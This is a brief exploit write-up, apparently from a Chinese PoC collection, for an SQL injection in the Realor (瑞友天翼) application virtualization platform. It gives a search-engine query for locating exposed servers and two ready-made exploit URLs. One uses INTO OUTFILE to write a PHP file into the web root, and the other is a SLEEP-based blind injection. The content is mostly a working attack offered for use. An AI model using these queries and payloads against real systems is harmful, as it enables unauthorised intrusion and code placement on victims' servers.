## 瑞友天翼应用虚拟化系统appsave接口存在SQL注入漏洞

## hunter
```
app.name="REALOR 瑞友天翼虚拟化平台"
```

## poc
```
http://xx.xx.xx.xx/hmrao.php?s=/Admin/appsave&appid=1%27);select%200x3c3f70687020706870696e666f28293b3f3e%20into%20outfile%20%27C:\Program%20Files%20(x86)\RealFriend\Rap%20Server\WebRoot\123.php%27%20--+

http://xx.xx.xx.xx/hmrao.php?s=/Admin/appdel&list=1111111%27%29%29%20AND%20%28SELECT%206312%20FROM%20%28SELECT%28SLEEP%285%29%29%29coHe%29%23
```

## 漏洞来源
- https://mp.weixin.qq.com/s/-TliLqPaokAqcE_qj5OPVQ
